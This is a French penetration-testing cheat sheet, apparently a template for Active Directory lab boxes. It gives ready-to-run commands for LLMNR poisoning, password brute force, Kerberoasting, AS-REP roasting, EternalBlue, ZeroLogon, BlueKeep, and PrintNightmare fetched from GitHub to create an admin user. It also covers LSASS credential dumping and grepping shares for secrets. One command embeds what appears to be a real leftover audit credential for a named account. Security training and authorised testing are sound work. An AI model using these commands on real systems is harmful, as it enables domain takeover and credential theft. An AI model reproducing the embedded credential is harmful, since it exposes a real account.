# Box

![](img/pic.png)

* IP :
* Difficulté :
* OS :



## 1. Foothold

### 1.1 Reconnaissance globale

#### 1.1.1 Nmap

```bash
$ nmap -sC -sV -T4 -p- <RANGE_IP/masque>

```

```bash
$ sudo nmap -sU <RANGE_IP/masque>

```

```bash
$ nmap -sS --open -T4 <RANGE_IP/MASQUE>
```



### 1.2 Reconnaissance Windows

Faire chacun des [tests sans identifiants](attaques_sans_id.md).



### 1.3 Analyse des éléments énumérés / exploitation





## 2. Avec des identifiants du domaine

> Objectifs : 
>
> - Récupérer d'autres utilisateurs du domaine
> - Passer local admin / SYSTEM

### 2.1 Récolte d'informations

#### 2.1.1 LLMNR-NBT-NS

```bash
$ sudo responder -I eth0 -wFv
```



#### 2.1.2 Bloodhound

```bash
# Récupération des informations du domaine
$ bloodhound-python -d <DOMAIN.COM> -u '<USER_VALIDE>' -p '<MDP_VALIDE>' -gc <NOM_DC> -c all -ns <IP_DNS>
```



#### 2.1.3 Récupération des informations du domaine

```bash
# Résulats dans le répertoire "csv"
$ ./goddi-linux-amd64 -username="USER" -password='MOT_DE_PASSE' -domain="DOMAINE.DOMAINE" -dc="DC.DOMAINE" -unsafe
```



#### 2.1.4 Récupération de la politique de mot de passe / bruteforce

```bash
# Soit : avec Goddi à distance (dans le fichier Domain_Account_Policy.csv)
$ ./goddi-linux-amd64 -username="USER" -password='MOT_DE_PASSE' -domain="DOMAINE.DOMAINE" -dc="DC.DOMAINE" -unsafe

# Soit : avec cme
$ crackmapexec smb <IP_DC> -u 'USER' -p 'MOT_DE_PASSE' -d 'DOMAINE.DOMAINE' --pass-pol 
```

**Si pas de lock ** (`Account Lockout Threshold`) :

```bash
# Si Kerberos (port 88 ry 464)
# Bruteforce d'un mot de passe d'un utilisateur connu via le protocole Kerberos (pré-authentification)
$ kerbrute bruteuser --dc <DOMAIN_CONTROLLER> -d <DOMAIN.COM> <PASSWORD_WORDLIST> <USER_VALIDE>    

# Si partage SMB accessible
# Bruteforce d'un mot de passe d'un utilisateur connu sur un partage SMB
$ crackmapexec smb <IP_DC> -u <USERS_VALIDES_WORDLIST> -p <PASSWORD_WORDLIST> --continue-on-success
```



#### 2.1.5 Liste des shares

```bash
$ crackmapexec smb <RANGE_IP/MASQUE> -u 'USER' -p 'MOT_DE_PASSE' --shares  
```



#### 2.1.6 Récupération des fichiers légers des shares puis GREP

```bash
# Résultats dans /tmp/cme_spider_plus
$ crackmapexec smb <RANGE_IP/MASQUE> -u 'USER' -p 'MOT_DE_PASSE' -M spider_plus -o READ_ONLY=false

# Différents GREP pouvant permettre de récupérer des identifiants
$ cd /tmp/cme_spider_plus
$ grep -Ria -C 10 'secret'
$ grep -Ria -C 10 'password'
$ grep -Ria -C 10 'admin'
$ grep -Ria -C 10 'pass'
$ grep -Ria -C 10 'sql'
$ grep -Ria -C 10 'token'
```



#### 2.1.7 Kerberoasting

```bash
$ impacket-GetUserSPNs -request -dc-ip <IP_DC> 'DOMAIN/USERNAME:PASSWORD'
```



#### 2.1.8 ASREP-Roasting

```bash
# Avec ID, requête sur l'annuaire et vérifie si la pré-auth Kerberos est activée pour chaque compte du domaine
$ impacket-GetUserSPNs -request -dc-ip <IP_DC> '<DOMAINE.DOMAINE>/USER:<MOT_DE_PASSE>'

# Sans ID, bruteforce et demande pour chaque utilisateur dans la liste fournie s'il peut récupérer son TGT
$ impacket-GetNPUsers 'DOMAIN/USERNAME' <USER_LIST> -no-pass
```





### 2.2 Exploitation

#### 2.2.1 MS14-025 (gpp_password)

```bash
$ crackmapexec smb <IP_DC> -u "auditeur.01" -p 'Winamax@2022!' -M gpp_password
```

#### 2.2.2 MS17-010 (ethernal-blue)

```bash
$ msfconsole
use scanner/smb/smb_ms17_010
```

#### 2.2.3 Zero logon

```bash
$ msfconsole
use admin/dcerpc/cve_2020_1472_zerologon
```

#### 2.2.4 Bluekeep

```bash
$ msfconsole
auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

#### 2.2.5 Print-Nightmare

```bash
# Sur la machine, sans AV donc
$ git clone https://github.com/calebstewart/CVE-2021-1675
# Sur une console powershell
Get-ExecutionPolicy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
import-module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "slash" -NewPassword "slash"
```

#### 2.2.6 Winpeas

```bash
# Sur la machine, sans AV donc
# upload winPeas.exe
&> .\winPEASany.exe
# pour avoir les bonnes couleurs
&> REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

# Si AV, essayer le .bat
```



## 3. Avec des identifiants local admin / SYSTEM

### 3.1 Récolte d'informations

#### 3.1.1 Dump LSASS

```bash
# A distance
$ crackmapexec smb <IP_PARTAGE> -u USERNAME -p PASSWORD -M lsassy 

# Si déjà connecté sur le poste client
C:\> .\mimikatz.exe
```



## 4. En dernier recours

### 4.1 Web

#### 4.1.1 Dirsearch

```bash
$ python3 /opt/dirsearch-git/dirsearch.py -u "http://FQDN" -e php,txt,go,json --random-agent -x 500,404,400
```

#### 4.1.2 Gobuster

```bash
$ gobuster vhost -u http://FQDN -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 | grep 200
```

#### 4.1.3 Gospider

```bash
# Profondeur de 5
$ gospider -s http://FQDN -d 5
```



### 4.2 Imprimantes

> Ressources :
>
> - http://hacking-printers.net/wiki/index.php/File_system_access
> - http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-4107
> - CVE 2022-24292 : à suivre ...

```bash
$ python pret.py <IP_IMPRIMANTE> pjl
# Activer le mode debug
SHELL_PRET:/> debug
# Enumération des répertoires visibles et listables 
SHELL_PRET:/> fuzz path
```



## 5. Annexes

### 5.1 Identifiants

